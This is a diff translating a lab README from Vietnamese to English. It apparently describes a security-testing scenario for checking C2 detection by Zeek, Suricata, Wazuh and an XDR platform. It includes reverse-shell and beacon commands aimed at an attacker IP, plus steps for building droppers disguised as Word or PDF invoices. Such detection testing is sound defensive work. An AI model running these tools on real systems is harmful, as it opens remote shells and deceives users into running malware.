@@ -1,8 +1,8 @@
-# C2 Outbound Connection - Kiểm thử kết nối C2
+# C2 Outbound Connection - C2 Connection Testing
 
-## Mô tả
+## Description
 
-Kịch bản này mô phỏng kỹ thuật **Application Layer Protocol (T1071)** trong khung MITRE ATT&CK. Đây là giai đoạn sau khi mã độc đã xâm nhập thành công vào máy nạn nhân và bắt đầu thiết lập kênh liên lạc bí mật (C2 Channel) ra máy chủ điều khiển.
+This scenario simulates the **Application Layer Protocol (T1071)** technique from the MITRE ATT&CK framework. It represents the post-compromise phase where malware has successfully infiltrated a victim's machine and begins establishing a covert communication channel (C2 Channel) to the command and control server.
 
 ## MITRE ATT&CK Techniques
 
@@ -12,15 +12,15 @@ Kịch bản này mô phỏng kỹ thuật **Application Layer Protocol (T1071)*
 | T1204.002 | User Execution: Malicious File | `dropper.py`                 |
 | T1036.005 | Masquerading                   | `dropper.py` (fake document) |
 
-## Mục tiêu kiểm thử
+## Testing Objectives
 
-- Kiểm chứng khả năng giám sát lưu lượng mạng chiều đi (Outbound Traffic) của hệ thống **Suricata/Zeek**
-- Đánh giá khả năng phát hiện hành vi tiến trình kết nối mạng bất thường trên Endpoint của **Wazuh Agent**
-- Xác minh khả năng tự động hóa phản ứng của **SmartXDR**
+- Verify the ability of **Suricata/Zeek** to monitor outbound network traffic
+- Evaluate the ability of **Wazuh Agent** to detect abnormal process network connections on endpoints
+- Validate the automated response capabilities of **SmartXDR**
 
-## Cấu hình kiểm thử
+## Test Configuration
 
-| Vai trò              | Máy        | IP               | Công cụ       |
+| Role                 | Machine    | IP               | Tool          |
 | -------------------- | ---------- | ---------------- | ------------- |
 | Attacker (C2 Server) | Kali Linux | `192.168.71.100` | `netcat`      |
 | Victim               | Windows 11 | `192.168.85.150` | Python script |
@@ -29,17 +29,17 @@ Kịch bản này mô phỏng kỹ thuật **Application Layer Protocol (T1071)*
 
 ## 1. C2 Reverse Shell (`c2_reverse_shell.py`)
 
-### Chế độ Interactive Shell
+### Interactive Shell Mode
 ```bash
 python c2_reverse_shell.py --host 192.168.71.100 --port 80
 ```
 
-### Chế độ Beacon
+### Beacon Mode
 ```bash
 python c2_reverse_shell.py --host 192.168.71.100 --port 80 --beacon
 ```
 
-### Chế độ IOC Trigger (Đọc từ file)
+### IOC Trigger Mode (Read from file)
 ```bash
 python c2_reverse_shell.py --ioc-file malicious_ip.txt
 ```
@@ -48,73 +48,75 @@ python c2_reverse_shell.py --ioc-file malicious_ip.txt
 
 ## 2. Fake Document Dropper (`dropper.py`)
 
-Mô phỏng kỹ thuật User Execution - người dùng "vô ý" chạy file .exe giả dạng tài liệu.
+Simulates the User Execution technique - user "accidentally" runs an .exe file disguised as a document.
 
-### Cách hoạt động
-1. Người dùng click vào file `Invoice_2024.exe` (có icon Word)
-2. File mở một tài liệu giả (HTML invoice) trong browser
-3. Đồng thời, payload C2 chạy ngầm ở background
-4. Hệ thống detection ghi nhận kết nối ra ngoài
+### How it works
+1. User clicks on `Invoice_2024.exe` file (with Word icon)
+2. File opens a fake document (HTML invoice) in browser
+3. Simultaneously, C2 payload runs silently in background
+4. Detection system records the outbound connection
 
 ### Build Dropper
 ```bash
-# Build với icon Word
+# Build with Word icon
 python build.py dropper
 
-# Build với icon PDF
+# Build with PDF icon
 python build.py dropper-pdf
 ```
 
 ### Output
 ```
-dist/dropper/Invoice_2024.exe      # Fake Word document
+dist/dropper/Invoice_2024.exe        # Fake Word document
 dist/dropper-pdf/Report_Q4_2024.exe  # Fake PDF document
 ```
 
 ---
 
-## Tham số CLI
+## CLI Parameters
 
-| Tham số         | Mô tả                          | Mặc định           |
-| --------------- | ------------------------------ | ------------------ |
-| `-H, --host`    | IP của C2 Server               | `192.168.71.100`   |
-| `-p, --port`    | Port của C2 Server             | `80`               |
-| `--ioc-file`    | File chứa danh sách IP độc hại | `malicious_ip.txt` |
-| `--timeout`     | Timeout cho IOC trigger (giây) | `3`                |
-| `--delay`       | Delay giữa các kết nối (giây)  | `1.0`              |
-| `-v, --verbose` | Hiển thị log chi tiết          | `False`            |
+| Parameter       | Description                     | Default            |
+| --------------- | ------------------------------- | ------------------ |
+| `-H, --host`    | C2 Server IP                    | `192.168.71.100`   |
+| `-p, --port`    | C2 Server Port                  | `80`               |
+| `--ioc-file`    | File containing malicious IPs   | `malicious_ip.txt` |
+| `--timeout`     | Timeout for IOC trigger (sec)   | `3`                |
+| `--delay`       | Delay between connections (sec) | `1.0`              |
+| `-v, --verbose` | Show detailed logs              | `False`            |
 
 ---
 
+## Deploy Zeek Detection
 
-## Deploy Zeek
-# Zeek
+```bash
+# Copy Zeek script
 cp c2_detection.zeek /opt/zeek/share/zeek/site/
 
+# Add to local configuration
 echo '@load base/frameworks/signatures' >> /opt/zeek/share/zeek/site/local.zeek
-
 echo '@load-sigs ./c2_detection.zeek' >> /opt/zeek/share/zeek/site/local.zeek
 
-
+# Deploy
 zeekctl deploy
+```
 
-## Kết quả mong đợi
+## Expected Results
 
-### Hệ thống phát hiện:
-- **Suricata/Zeek**: Ghi nhận TCP connection từ `192.168.85.150` → `192.168.71.100:80`
-- **Wazuh Agent**: Ghi nhận Sysmon Event ID 3 (Network Connection)
-- **MISP Integration**: So khớp IP đích với IoC database
+### Detection Systems:
+- **Suricata/Zeek**: Records TCP connection from `192.168.85.150` -> `192.168.71.100:80`
+- **Wazuh Agent**: Records Sysmon Event ID 3 (Network Connection)
+- **MISP Integration**: Matches destination IP with IoC database
 
-### Phản ứng tự động:
-- **pfSense**: Chặn IP `192.168.71.100`
-- **Wazuh Active Response**: Cô lập máy Windows 11
-- **DFIR-IRIS**: Tạo Case mới
-- **Telegram**: Gửi thông báo cảnh báo
+### Automated Response:
+- **pfSense**: Block IP `192.168.71.100`
+- **Wazuh Active Response**: Isolate Windows 11 machine
+- **DFIR-IRIS**: Create new Case
+- **Telegram**: Send alert notification
 
 ---
 
-## Cảnh báo
+## Warning
 
-> **⚠️ CHỈ SỬ DỤNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT**
+> **FOR SECURITY TESTING PURPOSES ONLY**
 > 
-> Script này mô phỏng hành vi mã độc. Việc sử dụng trái phép có thể vi phạm pháp luật.
+> This script simulates malware behavior. Unauthorized use may violate the law.
